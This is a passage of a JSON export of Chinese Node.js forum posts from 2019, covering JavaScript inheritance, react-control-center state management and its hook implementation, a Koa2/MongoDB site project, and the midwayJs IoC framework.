&#x2F;&#x2F; 👍 可以定义公有引用属性不会被共享\n}\nParent.prototype = {\n    constructor: Parent, &#x2F;&#x2F; ❌ 需要手动绑定 constructor\n    share: [1, 2, 3], &#x2F;&#x2F; 👍 这里定义的公有属性会被共享\n    log: function() { &#x2F;&#x2F; 👍 方法被共享了\n        return this.name\n    }\n}\n\nfunction Child(name, friends, gender) {\n    Parent.call(this, name, friends) &#x2F;&#x2F; 👍 可以向父类传递参数 ⚡ 这里又调用了一次 Parent\n    this.gender = gender\n}\n\nfunction proto(child, parent) {\n    let clonePrototype = Object.create(parent.prototype)\n    child.prototype = clonePrototype\n    child.prototype.constructor = child\n}\n\nproto(Child, Parent)\n</code></pre><h2>ES6 class</h2>\n<p>class 的语法，就比较清晰了，能用 class 就用 class 吧：</p>\n<pre class=\"prettyprint language-js\"><code>class Parent {\n    constructor(name, friends) { &#x2F;&#x2F; 该属性在构造函数上，不共享\n        this.name = name\n        this.friends = friends\n    }\n    log() { &#x2F;&#x2F; 该方法在原型上，共享\n        return this\n    }\n}\nParent.prototype.share = [1, 2, 3] &#x2F;&#x2F; 原型上的属性，共享\n\nclass Child extends Parent {\n    constructor(name, friends, gender) {\n        super(name, friends)\n        this.gender = gender\n    }\n}\n</code></pre><blockquote>\n<p>另外可以使用 get set 方法将 share 属性写入到原型中去</p>\n</blockquote>\n<p>另外，class 是一种语法糖使用 babel 将其转化一下看看：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5e05d116f?w=765&amp;h=886&amp;f=png&amp;s=32935\" alt=\"20190317201244.png\"></p>\n<h2>小结</h2>\n<p>最后上个图作为总结：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac617e0f42b?w=1545&amp;h=573&amp;f=png&amp;s=89069\" alt=\"20190317202656.png\"></p>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://github.com/mqyqingfeng/Blog/issues/16\">https://github.com/mqyqingfeng/Blog/issues/16</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000015727237\">https://segmentfault.com/a/1190000015727237</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000015216289\">https://segmentfault.com/a/1190000015216289</a></li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/14/1697caae8a996c2e?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"💎 一文看懂 JS 继承","last_reply_at":"2019-03-17T12:44:25.774Z","good":false,"top":false,"reply_count":0,"visit_count":369,"create_at":"2019-03-17T12:44:25.774Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c8df6cc7ce0df3732428d53","author_id":"5718a014a10228e950e8137c","tab":"share","content":"<div class=\"markdown-text\"><p>最近发现国内搜索一些技术问题时，经常会碰到某云的译文，大多翻译自 stackoverflow，但是翻译质量较差，更新也不及时（比如有的答案有了纠正，但是译文没更新），并且有版权违规。SO 的内容允许再加工发布，但是要遵循 CC 协议。于是我在学习 mongo 的时候顺道做了网站。主要以下特点：</p>\n<ol>\n<li>翻译方面用机翻（翻译前后做了大量过滤和筛选）+人工+加机器学习，尽量保证质量。</li>\n<li>每日轮询查询官方 API，保持对已有问题的及时更新。</li>\n<li>每条问答都附带原文链接，方便读者查阅。同时原作者链接也保留。</li>\n<li>目标是翻译几个自己比较熟悉的 stack，也方面做语法调教。还有就是谷歌的 api 太贵。</li>\n</ol>\n<p>目前正在调教翻译纠错器中。大家有什么建议欢迎提出！\n地址： <a href=\"https://www.coderanswer.com/\">https://www.coderanswer.com/</a></p>\n</div>","title":"一个问答译文网站","last_reply_at":"2019-03-17T07:27:08.628Z","good":false,"top":false,"reply_count":0,"visit_count":402,"create_at":"2019-03-17T07:27:08.628Z","author":{"loginname":"stanlogin","avatar_url":"https://avatars2.githubusercontent.com/u/376822?v=4&s=120"}},{"id":"5c8dec3a7ce0df3732428d28","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><h3>前言</h3>\n<p>最近浏览到<code>vue</code>开发者尤雨溪以前的采访文章，感触颇深，其中有一段问答大概是这样：</p>\n<blockquote>\n<p>采访：是什么驱使你开发 Vue.js 的？<br>\n答：我想，我可以只把我喜欢的部分从 Angular 中提出来，建立一个非常轻巧的库，不需要那些额外的逻辑。我也很好奇 Angular 的源码到底是怎么设计的。我最开始只是想着手提取 Angular 里面很小的功能，如声明式数据绑定。Vue 大概就是这么开始的。\n用过一段时间之后，我感觉我做的东西还有点前途，因为我自己就很喜欢用。于是我花了更多的时间把它封装好，取了一个名字叫做 Vue.js，我记得那时还是 2013 年。后来我想『我花了这么多时间，不能只有我一个人用，我应该和别人分享，他们也会感觉到 Vue 的好处，他们也会喜欢上 Vue 的。』</p>\n</blockquote>\n<p>尤大的确非常直接，<code>因为我自己喜欢用，所以我想分享给多的人，想让更多的人喜欢...</code>，这是每一个开源作者由衷的体验，从开源日期来说，<code>react-control-center</code>的确非常非常的短，有一些朋友在成为种子用户之前，都会问我一个问题，</p>\n<blockquote>\n<p>为什么有了redux, 或者说dva、rematch等更好的redux wrapper，以及mobx这样强大的状态管理框架，还要写一个react-control-center呢？这样一个轮子是不是有一点多余</p>\n</blockquote>\n<p>在回答这个问题之前，我想了下，尤大的那一段采访回答的确非常符合我的心境，首先呢，我们的项目也在大量的过使用<code>redux</code>或者<code>dva</code>,我自己私底下也了解过<code>mobx</code>，可是切换为<code>react-control-center</code>的确让我们的代码更加简洁和更容易维护与扩展，而且比<code>redux</code>多了很多非常好玩的特性，因为<code>react-control-center</code>是基于<code>react</code>的<code>setState</code>做了增强，所以不存在黑魔法，只是让你更优雅的调用<code>setState</code>而已哦，接下来我聊一聊变化侦测，再结合<code>setState</code>你一定会明白，或许我们不需要<code>redux</code>这种方式，而是回归<code>react</code>本质去做状态管理，一样可以高效而简单，但是却可以更加强大和有趣。</p>\n<hr>\n<h3>变化侦测</h3>\n<h4>pull &amp; push</h4>\n<p>变化侦测这个词在尤大的采访中提过不少次，我们同时也能看到尤大提到了变化侦测分为两种<code>pull</code>和<code>push</code>，这里我结合我对尤大的理解的解读和从我自己的视觉来谈一谈<code>pull</code>和<code>push</code>，本质上来说，这是两种不同的驱动方式来驱动数据和视图保持同步，只不过前者<code>pull</code>对于UI框架来说被动触发，<code>react</code>里暴露一个<code>setState</code>入口来让开发人工的提交要改变的数据，这样<code>react</code>才知道数据变化了，<code>push</code>对于UI框架来说主动触发，对于<code>vue</code>来说，你为组件声明的<code>data</code>都被转换成了<code>observable</code>对象，所以当你使用<code>this.username='xxx'</code>的时候，<code>vue</code>能够主动侦测到你的数据发生了变化，数据和视图浑然一体。<br>\n这两种方式没有谁更好谁更优秀一说，性能上不会成为你评判该采用谁是最优解的标准，更多的我们从工程性的角度来说，视图渲染逻辑和业务逻辑必然耦合在一起，所以才有<code>vuex</code>、<code>redux</code>类似的方案，不只是帮你解决状态管理的问题，同时也帮你分离了业务逻辑和视图渲染逻辑。</p>\n<h4>cc接管setState后发生了什么</h4>\n<p>让我们把目光回到<code>pull</code>和<code>react</code>的<code>setState</code>上，<code>setState</code>的参数其实很简单，你只需要提交你要修改的<code>partialState</code>给<code>react</code>，<code>react</code>就触发更新了。<br>\n对于<code>cc</code>而言，将原始的<code>setState</code>保存为<code>reactSetState</code>，然后用户调用的<code>setState</code>已不再是最初的那个句柄，而是<code>cc</code>自己的实现了，我们聊<code>cc</code>的<code>setState</code>实现步骤之前，看看<code>register</code>函数的参数签名。</p>\n<pre class=\"prettyprint\"><code>register(ccClassKey:string, registerOption?:{module?:string, sharedStateKeys?:Array&lt;string&gt;|&#x27;*&#x27;, globalStateKeys?:Array&lt;string&gt;|&#x27;*&#x27;});\n</code></pre><p>当你的一个普通的<code>react class</code>注册为<code>cc class</code>的时候，通过设定<code>registerOption.module</code>告诉<code>cc</code>这个<code>cc class</code>属于哪个<code>module</code>,通过设定<code>registerOption.sharedStateKeys</code>告诉<code>cc</code>这个<code>cc class</code>的所有实例会共享那些<code>sharedStateKey</code>的值变化，所以<code>cc</code>内部的上下文会维护的两个<code>map</code>，第一个是<code>module_ccClassKeys_</code>，键就是模块名，值就是这个模块下有哪些<code>ccClassKey</code>，第二个是<code>ccClassKey_ccClassContext_</code>，键就是<code>ccClassKey</code>，值就是<code>ccClassContext</code>，<code>ccClassContext</code>内部维护一个引用数组，表示当前<code>ccClassKey</code>已经实例化了多少个<code>cc instance</code>。<br>\n现在我们看一看如下的代码片段示意：</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;假设store.foo如下：\nstore:{\n    foo:{\n        name:1,\n        age:2,\n        grade:3,\n    }\n}\n\nclass Foo extends Component{\n    &#x2F;&#x2F;constructor略\n    onNameChange = (e)=&gt;{\n        this.setState({name:e.currentTarget.value});\n    }\n    onAgeChange = (e)=&gt;{\n        this.setState({name:e.currentTarget.value});\n    }\n    render(){\n        const {name, age} = this.state;\n        return (\n            &lt;Fragment&gt;\n                &lt;input onChange={this.onNameChange}&#x2F;&gt;\n                &lt;input onChange={this.onAgeChange}&#x2F;&gt;\n            &lt;&#x2F;Fragment&gt;\n        );\n    }\n}\nconst CcFoo1 = cc.register(&#x27;Foo1&#x27;, {module:&#x27;foo&#x27;, sharedStateKeys:[&#x27;name&#x27;]})(Foo);\nconst CcFoo2 = cc.register(&#x27;Foo2&#x27;, {module:&#x27;foo&#x27;, sharedStateKeys:&#x27;*&#x27;})(Foo);\n\n&#x2F;&#x2F;in your App.js\nrender(){\n    return (\n        &lt;div&gt;\n            &lt;Foo &#x2F;&gt;\n            &lt;Foo &#x2F;&gt;\n            &lt;CcFoo1 &#x2F;&gt;\n            &lt;CcFoo1 &#x2F;&gt;\n            &lt;CcFoo2 &#x2F;&gt;\n            &lt;CcFoo2 &#x2F;&gt;\n        &lt;&#x2F;div&gt;\n    );\n}\n\n</code></pre><p><code>Foo</code>的实例其实孤立的，它们之间的state是独立维护的，<code>CcFoo1</code>尽管属于<code>foo</code>模块，但是只是标记了<code>sharedStateKeys</code>包含<code>name</code>，所以只有<code>name</code>的值变化是共享到了<code>foo</code>模块的状态里，<code>CcFoo2</code>标记了<code>sharedStateKeys</code>为<code>*</code>，所以<code>foo</code>模块的所有状态变化都会被<code>cc</code>同步到<code>CcFoo2</code>的所有实例上。</p>\n<ul>\n<li>那我们现在来具体化这个过程，如果<code>CcFoo1</code>的一个实例改变了<code>name</code>，当你调用<code>setState</code>的时候，<code>cc</code>先调用当前实例的<code>reactSetState</code>触发UI渲染行为。</li>\n<li>然后你提交的<code>{name:'xxx'}</code>经过<code>cc</code>分析，当前实例所属的cc类<code>Foo1</code>下还有另一个实例<code>CcFoo1_ins2</code>，所以除了调用<code>reactSetState</code>把状态设置到当前实例，也会调用<code>CcFoo1_ins2.reactSetState</code>把状态设置回去。</li>\n<li>同样的通过<code>module_ccClassKeys_</code>这个映射关系，<code>cc</code>发现还有另一个cc类<code>Foo2</code>也属于<code>foo</code>模块，然后<code>cc</code>会通过<code>ccClassKey_ccClassContext_</code>取出这个cc类的其他实例，遍历的调用<code>reactSetState</code>把状态设置到哪些具体的实例上，这样一个过程，在<code>cc</code>内部成为<code>状态广播</code>，看到了吗？原理非常简单，同时也非常高效，没有<code>angular</code>那样的生成一个个<code>watcher</code>做脏检查，仅仅只是找到正确的引用，提取合适的状态，然后触发<code>reactSetState</code>，便结束了，这便是为什么我说<code>react-control-center</code>只是让<code>setState</code>更加智能而已。</li>\n</ul>\n<pre class=\"prettyprint\"><code>Foo ins1 --- name changed ---&gt; Foo ins2\nFoo ins2 --- name changed ---&gt; Foo ins2\n\nCcFoo1 ins1 --- name changed ---&gt; CcFoo1 ins1\n                            |--&gt; CcFoo1 ins2\n                            |--&gt; CcFoo2 ins1\n                            |--&gt; CcFoo2 ins2\n                            \nCcFoo2 ins1 --- age changed ---&gt; CcFoo2 ins1\n                            |--&gt; CcFoo2 ins2\n\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/10/16965e5dec6b197e?w=1672&amp;h=1024&amp;f=png&amp;s=205701\" alt></p>\n<h4>more than setState</h4>\n<p>当然<code>cc</code>不只是提供<code>setState</code>这个入口让你去修改，因为通常能够修改数据之前都会有不少的业务逻辑，最后才到<code>setState</code>这一步触发UI渲染，所以<code>cc</code>通过更强大、更灵活的api让你不在和<code>setState</code>打交道。</p>\n<ul>\n<li>dispatch(action:Action | reducerDescriptorStr, payload?:any)，<code>dispatch</code>的本质是找到你定义的<code>reducer</code>函数去执行，执行完之后返回一个新的<code>partialState</code>就完了，其它的一切交个<code>cc</code>搞定。</li>\n<li><code>cc</code>并不强制<code>reducer</code>函数返回新的<code>partialState</code>，提供一个<code>dispatch</code>句柄让你组合多个<code>reducer</code>函数执行，串行或者是并行任君选择，是不是非常的惬意^_^</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;reducer in StartupOption\ncc.startup({\n    reducer:{\n        &#x27;foo&#x27;:{\n            changeName({payload:name}){\n                return {name};\n            },\n            async changeNameCool({dispatch, payload:name}){\n                await dispatch(&#x27;changeName&#x27;, name);\n                &#x2F;&#x2F; await dispatch(); 组合多个函数串行执行\n            }\n        }\n    }\n})\n\nclass Foo extends Component{\n    &#x2F;&#x2F;constructor略\n    onNameChange = (e)=&gt;{\n        &#x2F;&#x2F;this.$$dispatch({type:&#x27;changeName&#x27;, payload:e.currentTarget.value});\n        &#x2F;&#x2F;推荐这种更简便的写法\n        this.$$dispatch(&#x27;changeName&#x27;, e.currentTarget.value);\n    }\n    changeNameCool = ()=&gt;{\n         this.$$dispatch(&#x27;changeNameCool&#x27;, e.currentTarget.value);\n    }\n    render(){\n        const {name, age} = this.state;\n        return (\n            &lt;Fragment&gt;\n                &lt;input value={name} onChange={this.onNameChange}&#x2F;&gt;\n                &lt;input value={name} onChange={this.changeNameCool}&#x2F;&gt;\n            &lt;&#x2F;Fragment&gt;\n        );\n    }\n}\n</code></pre><ul>\n<li>invoke(userFn:function, …args)，如果你讨厌走<code>dispatch</code>去命中<code>reducer</code>函数这个套路，<code>cc</code>同样允许你调用自定义函数，invoke默认改变自己实例所属模块的状态。</li>\n<li>effect(module:string, userFn:function, …args)，你需要改变其他模块的状态，cc同样支持。</li>\n<li>打破了<code>redux</code>的套路，状态追踪怎么办？其实这是一个你无须担心的问题，你调用<code>dispatch</code>、<code>invoke</code>、<code>effect</code>等这些句柄时，都是暗自携带者上下文的。</li>\n</ul>\n<blockquote>\n<p>1 包括这一次调用提交的状态<br>\n2 这此调用时哪一种方式触发的，用户可以使用setState的哦…<br>\n3 这次调用是从哪个实例产生的</p>\n</blockquote>\n<p>所以你想一想，是不是比<code>redux</code>一个孤独的<code>action type</code>能给你更多的信息？当然状态管理只是<code>cc</code>里该做的一部分，同样的更友好的副作用书写方式，类vue的<code>computed</code>、<code>watch</code>、<code>emit&amp;on</code>等更好玩的特性才是<code>cc</code>要帮助你用更优雅的方式书写<code>react</code>。</p>\n<h3>hook</h3>\n<p>新版的react已经发布了，<code>hook</code>已成为稳定版的api，<code>facebook</code>在此基础上提出了新的组件划分方式：<code>class component</code>和<code>function component</code>，注意到没有，不再说笨组件和智能组件了，因为<code>function component</code>可以使用<code>hook</code>，它不再是笨蛋了…<br>\n<code>function component</code>可以管理自己状态，甚至可以通过<code>useContext</code>实现不同的<code>function component</code>之间共享状态，看起来<code>class component</code>慢慢会被取代吗？<br>\n这一点目前个人不敢下结论，但是在<code>cc</code>的世界里，因为有了<code>CcFragment</code>的存在，能够让你不用为了使用一些现有的<code>store</code>和<code>reducer</code>组合一个新的视图而去抽一个<code>class</code>出来的不必要局面，你可以达到快速复用现有的<code>stateless component</code>包裹在<code>CcFragment</code>，同样的考虑到用户需要在<code>CcFragment</code>管理自己的状态，<code>cc</code>最新版本已支持在<code>CcFragment</code>里使用<code>hook</code>，这不是一个对<code>react hook</code>的包裹，而是独立的实现，所以你依然可以在<code>react 15</code>里使用，api命名和使用效果和<code>react hook</code>保持100%一致，当然使用规则也是一样的：<code>不要在循环,条件或嵌套函数中调用Hook</code>，注意哦，<code>cc</code>的<code>hook</code>仅仅限在<code>CcFragment</code>内使用。\n<img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698a47292a0a147?w=853&amp;h=556&amp;f=gif&amp;s=1209881\" alt></p>\n<pre class=\"prettyprint\"><code> &lt;CcFragment connect={{&#x27;counter&#x2F;*&#x27;:&#x27;&#x27;}} render={({ hook, propState }) =&gt; {\n    const [count, setCount] = hook.useState(0);\n    hook.useEffect(()=&gt;{\n      document.title = &#x27;count &#x27;+count;\n      return ()=&gt;{\n        document.title = &#x27;CcFragment unmount &#x27;;\n      }\n    });\n    &#x2F;&#x2F;如果只想让effect函数在didMount的执行，可以写为 hook.useEffect(fn, []);\n    &#x2F;&#x2F;如果只想让effect函数依赖count值是否变化才执行，可以写为 hook.useEffect(fn, [count]);\n\t\n    return (\n      &lt;div style={{border:&#x27;6px solid gold&#x27;, margin:&#x27;6px&#x27;}}&gt;\n        &lt;h3&gt;show CcFragment hook feature&lt;&#x2F;h3&gt;\n        {propState.counter.count}\n        &lt;hr &#x2F;&gt;\n        {count}\n        &lt;button onClick={() =&gt; setCount(count + 1)}&gt;+&lt;&#x2F;button&gt;\n        &lt;button onClick={() =&gt; setCount(count - 1)}&gt;-&lt;&#x2F;button&gt;\n      &lt;&#x2F;div&gt;\n    )\n  }} &#x2F;&gt;\n</code></pre><p>有了<code>hook</code>，<code>CcFragment</code>不仅能打通<code>store</code>，也能够独立管理自己的状态，是不是更可爱了呢？<br>\n<a href=\"https://github.com/fantasticsoul/react-control-center/blob/master/src/component/CcFragment.js\">hook实现</a>如下，其实正如<code>react hook</code>所说，不是魔法，只是数组…</p>\n<pre class=\"prettyprint\"><code>    &#x2F;&#x2F; hook implement fo CcFragment\n    const __hookMeta = {\n      isCcFragmentMounted:false,\n      useStateCount: 0,\n      useStateCursor: 0,\n      stateArr:[],\n      useEffectCount: 0,\n      useEffectCursor: 0,\n      effectCbArr:[],\n      effectSeeAoa:[],&#x2F;&#x2F; shouldEffectExecute array of array\n      effectSeeResult:[],&#x2F;&#x2F; collect every effect fn&#x27;s shouldExecute result\n      effectCbReturnArr:[], \n    }\n    this.__hookMeta = __hookMeta;\n    const hook = {\n      useState: initialState =&gt; {\n        let cursor = __hookMeta.useStateCursor;\n        const stateArr = __hookMeta.stateArr;\n        __hookMeta.useStateCursor++;\n        if (__hookMeta.isCcFragmentMounted === false) {&#x2F;&#x2F;render CcFragment before componentDidMount\n          __hookMeta.useStateCount++;\n          stateArr[cursor] = initialState;\n        } else {\n          cursor = cursor % __hookMeta.useStateCount;\n        }\n\n        const setter = newState =&gt; {\n          stateArr[cursor] = newState;\n          this.cc.reactForceUpdate();\n        }\n        return [stateArr[cursor], setter];\n      },\n      useEffect: (cb, shouldEffectExecute) =&gt; {\n        let cursor = __hookMeta.useEffectCursor;\n        __hookMeta.useEffectCursor++;\n        if (__hookMeta.isCcFragmentMounted === false) {\n          __hookMeta.effectCbArr.push(cb);\n          __hookMeta.effectSeeAoa.push(shouldEffectExecute);\n          __hookMeta.useEffectCount++;\n        } else {\n          &#x2F;&#x2F; if code running jump into this block, CcFragment already mounted, and now compute result for didUpdate\n          cursor = cursor % __hookMeta.useEffectCount;\n          if (Array.isArray(shouldEffectExecute)) {\n            const len = shouldEffectExecute.length;\n            if (len == 0) {\n              __hookMeta.effectSeeResult = false;&#x2F;&#x2F; effect fn will been executed only in didMount\n            } else {&#x2F;&#x2F; compare prevSee and curSee\n              let effectSeeResult = false;\n              const prevSeeArr = __hookMeta.effectSeeAoa[cursor];\n              if (!prevSeeArr) {\n                effectSeeResult = true;\n              } else {\n                for (let i = 0; i &lt; len; i++) {\n                  if (shouldEffectExecute[i] !== prevSeeArr[i]) {\n                    effectSeeResult = true;\n                    break;\n                  }\n                }\n              }\n              __hookMeta.effectSeeAoa[cursor] = shouldEffectExecute;\n              __hookMeta.effectSeeResult[cursor] = effectSeeResult;\n              if (effectSeeResult) __hookMeta.effectCbArr[cursor] = cb;\n            }\n          } else {\n            __hookMeta.effectSeeResult[cursor] = true;&#x2F;&#x2F; effect fn will always been executed in didMount and didUpdate\n            __hookMeta.effectSeeAoa[cursor] = shouldEffectExecute;\n            __hookMeta.effectCbArr[cursor] = cb;\n          }\n        }\n      }\n    }\n</code></pre><h4>结语</h4>\n<p>前人总结出的优秀的方案，为何不融入到cc里呢？期待看完本文的你，能所有收获。<code>hook</code>真的优雅的解决了在<code>CcFragment</code>里管理<code>localState</code>的问题，所以才被加入进来，不是为了加而加，期待你也能够爱上<code>cc</code>，爱上<code>CcFragment</code>，爱上<code>cc hook</code>。</p>\n<ul>\n<li><a href=\"https://github.com/fantasticsoul/react-control-center/blob/master/src/component/CcFragment.js\">欢迎了解并star，成为cc的种子用户</a></li>\n<li><a href=\"https://stackblitz.com/edit/dva-example-count-1saxx8?file=index.js\">在线示例点我，包含cc class 定义，CcFragmet，hook等</a></li>\n<li><a href=\"https://github.com/fantasticsoul/react-control-center\">cc版本ant-design-pro</a></li>\n<li><a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">基础入门项目</a></li>\n<li><a href=\"http://jsrun.net/vLXKp/play\">runjs录像教程</a></li>\n</ul>\n</div>","title":"聊一聊cc的变化侦测和hook实现","last_reply_at":"2019-03-17T06:42:02.340Z","good":false,"top":false,"reply_count":0,"visit_count":268,"create_at":"2019-03-17T06:42:02.340Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c8cca09acb681372d418c09","author_id":"5c381e903898674067a7e050","tab":"share","content":"<div class=\"markdown-text\"><p>#好利来公司官网</p>\n<h5></h5>\n<h3>代码目录</h3>\n<pre class=\"prettyprint\"><code>+-- public&#x2F;                                    ---公共样式\n+-- routes&#x2F;                               ---每个页面的路由模块\n+-- view&#x2F;                                 ---静态html\n+-- fail&#x2F;                                   ---入口文件\n+-- app.js&#x2F;\t\t\t\t\t\t\t        ---首页入\n+-- model&#x2F;\t\t\t\t\t\t            ---公共方法\n</code></pre><p>#程序安装方法</p>\n<pre class=\"prettyprint\"><code>1.确保电脑已经安装了NodeJS环境，运行版本尽量保持最新（V8以上吧），选择本地的一个路径，然后运行命令\n$ git clone https:&#x2F;&#x2F;github.com&#x2F;dezhizhang&#x2F;haolilaicompany.git\n2.进入程序的主目录（包含app.js的那个文件夹）运行命令：npm install，系统就会自动安装该程序的依赖包；\n3.启动数据库mongod --dbpath 路径地址\n4.在以上的步骤都执行完成且正确的情况下，就可以在程序主目录下面（有app.js的那个目录）,运行命令\n$ node app.js\n</code></pre><p>GIthub源码：<a href=\"https://github.com/dezhizhang/haolilaicompany\">https://github.com/dezhizhang/haolilaicompany</a>\n<img src=\"//static.cnodejs.org/FscEK-jAx5Jgu57lxhesZY0SatNo\" alt=\"17.png\">\n<img src=\"//static.cnodejs.org/FspaDFa3dc2Z6haBIv6jmQdwA2eT\" alt=\"12.png\">\n<img src=\"//static.cnodejs.org/FjESwIJJAQgUPaJXbG8n3IUtG8_B\" alt=\"22.png\">\n<img src=\"//static.cnodejs.org/FmAVOXO9O7ZbcDdmio9lrelN3vOF\" alt=\"9.png\">\n<img src=\"//static.cnodejs.org/Fjk2QPy-SnkKJLyZGXBY2diiCbdk\" alt=\"10.png\">\n<a href=\"https://github.com/dezhizhang/haolilaicompany\">github地址</a>\n如果喜欢请给个start</p>\n</div>","title":"koa2+mongodb+ejs开发大型网站前后台","last_reply_at":"2019-03-16T12:51:18.117Z","good":false,"top":false,"reply_count":2,"visit_count":445,"create_at":"2019-03-16T10:03:53.398Z","author":{"loginname":"dezhizhang","avatar_url":"https://avatars3.githubusercontent.com/u/28954583?v=4&s=120"}},{"id":"5c3700673898674067a7da2c","author_id":"4efc278625fa69ac6900038f","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://img.alicdn.com/tfs/TB1AruuBjTpK1RjSZKPXXa3UpXa-1890-566.png\" alt=\"main\"></p>\n<p>双旦已过，新年将至，midwayJs 向大家献上贺礼，首先奉上地址: <a href=\"https://github.com/midwayjs/midway/\">https://github.com/midwayjs/midway/</a>，欢迎 star ✨✨✨。</p>\n<p>之前我们向社区开放了我们的治理工具，也就是 Pandora.js 工具包，用于整个 Node.js 应用的监控和治理，我们承诺这不是结束，只是开源的开始。</p>\n<p>随着内部全栈应用数的越来越多，以及阿里业务不断提升的复杂度，比如店铺，搭建以及渲染等服务，随着人员的不断调动，产品的结构，代码的层级都随着不断的调整，我们急需一个能降低代码复杂度的解决方案，帮助我们渡过人员寒冬，这就对我们内部的基础架构体系提出了不同的要求。</p>\n<p>以往我们只需要让用户启动服务器，满足 RPC/HTTP 服务即可，而在真正的全栈领域，似乎没有太多的钻研和沉淀。对此，我们将内部使用的 midway 整体解决方案进行了一次重塑，并且在设计之初就提出未来将对外进行开源。</p>\n<p>正巧我们的第一款 Typescript 产品 Pandora.js 开源完毕，给了我们将代码用 Typescript 重写的信心，也随着 Egg.js 社区的壮大，我们相信，在不同的领域中，一定会有不同的产品，不同的解决方案。</p>\n<p>Midway 正式基于这些考虑，将 IoC 引入到了框架中，同时学习了 NestJs ，引入了不少自定义的装饰器，增强开发体验，也将搭配团队的其他产品，Pandora.js 和 Sandbox，将 Node.js 的开发体验朝着全新的场景发展，让用户在开发过程中享受到前所未有的愉悦感。</p>\n<p>在这里感谢前期的 beta 测试中向我们提意见以及试用的同学，感谢大家的包容和支持，特别是 <a href=\"/user/ZQun\">@ZQun</a> 和 <a href=\"/user/yuu2lee4\">@yuu2lee4</a> 两位的积极参与。</p>\n<p><img src=\"https://img.alicdn.com/tfs/TB19dSLBXzqK1RjSZFvXXcB7VXa-771-85.png\" alt=\"image-20190109121917392\"></p>\n<p>下面来介绍新版本 midway 的一些特性。</p>\n<ul>\n<li>\n<p>基于 IoC 体系业务代码进行解耦，依赖统一管理统一初始化</p>\n</li>\n<li>\n<p>常见的 web 场景装饰器简化业务开发</p>\n</li>\n<li>\n<p>支持 Egg.js 的所有插件体系，框架装饰器统一编码风格</p>\n</li>\n<li>\n<p>基于 Typescript ，面向接口编程的编码体验</p>\n</li>\n</ul>\n<h2>依赖注入疑问</h2>\n<p>在一年前，我们的业务代码是重重耦合，到处初始化，实例重复，但这并不是业务同学在代码架构方面的问题，而是在不断的业务迭代，交接下，早就脱离了最初的设想，代码的设计跟不上需求的速度。</p>\n<p>为此，我们尝试引入了依赖注入的方案。依赖注入最早听到是在 Java 端的 spring 框架，在 JS 方面，最早我们使用了 XML 做为基础的 IoC 方案，虽然解决了不少耦合和初始化的问题，也发现前端在 XML 的感受吐槽颇多。</p>\n<p>去年 Typescript 的大力发展之后，内部的很多项目都切换了过来，经过我们的调研，除了 NestJs 进行了自研以及在 Typescript 领域比较出名的 Inversify 模块，似乎很少有现成的易于扩展的模块。</p>\n<p>基于这些情况，我们进行了这方面的自建，一方面方便内部的扩展，能更好的在现有的体系上扩展装饰器，请求作用域等，另一方面也可以提升本身的能力，方便后续迭代。</p>\n<p>我们产出了 <code>injection</code> 模块，作为我们整个框架的依赖注入基础。</p>\n<p>如今，<code>injection</code> 承载起了整个 midway 体系，它将框架代码，业务代码，插件等都组合到了一起，像一个纽带在这些之间传输数据。</p>\n<p><img src=\"https://img.alicdn.com/tfs/TB1AQmDBgDqK1RjSZSyXXaxEVXa-2730-556.png\" alt=\"dep_image\"></p>\n<p>通过依赖注入容器的管理，如上图非常复杂的应用也能良好的维护和运作。</p>\n<p>想看完整大图，可以点击<a href=\"https://img.alicdn.com/tfs/TB1Ha5JBgHqK1RjSZFgXXa7JXXa-5328-556.png\">这里</a>。</p>\n<h2>面向装饰器开发</h2>\n<p>得益于 Typescript 对 ES6 的良好支持，提供了一种为类声明和成员添加注释和元编程语法的方法。装饰器作为TypeScript的实验性功能能够让我们在开发中简化代码。虽然是语法糖，但是带来的好处却不少。</p>\n<p>我们拿一个简单的例子，从 Controller 一步步经过 Service/Manager 向数据库拿数据，在多层的架构体系下，以往的代码大概率需要 new 出不同的实例，并且需要绑定到路由层，这边为了方便理解，代码放到了一起。</p>\n<pre class=\"prettyprint language-typescript\"><code>export = (app) =&gt; {\n  const home = new HomeController();\n  app.get(&#x27;&#x2F;&#x27;, home.index);\n}\n\nclass HomeController extends Controller {\n\n  reportService: IReportService;\n\n  constructor() {\n    this.reportService = new ReportService();\n  }\n    \n  async index(ctx) {\n    ctx.body = await this.reportService.getReport();\n  }\n}\n\nclass ReportService implements IReportService {\n\n  reporter: IReportManager;\n  \n  constructor() {\n    this.reporter = new ReporterManager();\n  }\n\n\n  async getReport(id: number) {\n    return await this.reporter.get(id);\n  }\n}\n\nclass ReporterManager implements IReportManager {\n\n  db;\n\n  constructor() {\n    this.initDB();\n  }\n\n  initDB() {\n    &#x2F;&#x2F; open connection\n  }\n\n  async get() {\n    &#x2F;&#x2F; return data from db;\n  }\n}\n\n</code></pre><p>经过 IoC 相关的 <code>@provide</code> 和 <code>@inject</code>  装饰器修饰以及其他 web 层的装饰器修饰过后，不仅仅只是代码量的减少，业务的代码也不再有实例化的过程。以往还需要考虑在构造器中做异步的操作，比如初始化时需要做异步连接数据库，这个时候也不再需要考虑，直接使用 <code>@init</code> 装饰即可。</p>\n<p>至此，我们会更加专注于面向接口进行编程，抽象，将代码设计的时间更多的花在理解需求，解决问题上。</p>\n<pre class=\"prettyprint language-typescript\"><code>@provide()\n@controller()\nexport class HomeController {\n\n  @inject()\n  reportService: IReportService;\n  \n  @get(&#x27;&#x2F;&#x27;)\n  async index(ctx) {\n    ctx.body = await this.reportService.getReport();\n  